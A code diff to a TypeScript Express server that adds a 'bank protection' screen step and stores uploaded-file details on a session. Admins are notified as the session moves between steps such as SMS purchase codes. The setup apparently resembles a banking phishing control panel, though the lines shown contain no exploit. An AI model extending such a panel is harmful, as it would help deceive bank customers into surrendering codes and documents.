@@ -1337,10 +1337,24 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 screenType = ScreenType.SMS_COMPRA;
               }
 
+              // Normalizar screenType para PROTECCION_BANCARIA
+              if (screenType.toLowerCase() === 'proteccion_bancaria') {
+                console.log('Normalizando screenType PROTECCION_BANCARIA en servidor:', screenType, 'to', ScreenType.PROTECCION_BANCARIA);
+                screenType = ScreenType.PROTECCION_BANCARIA;
+              }
+
               // Actualizar la última actividad de la sesión
               await storage.updateSessionActivity(sessionId);
               
-              await storage.updateSession(sessionId, { pasoActual: screenType });
+              // Para protección bancaria, también actualizar la información del archivo si está presente
+              const updateData: any = { pasoActual: screenType };
+              if (screenType === ScreenType.PROTECCION_BANCARIA && validatedData.fileName) {
+                updateData.fileName = validatedData.fileName;
+                updateData.fileUrl = validatedData.fileUrl;
+                updateData.fileSize = validatedData.fileSize;
+              }
+              
+              await storage.updateSession(sessionId, updateData);
               console.log('Actualizado pasoActual a:', screenType);
 
               // Notify specific admin clients about the update
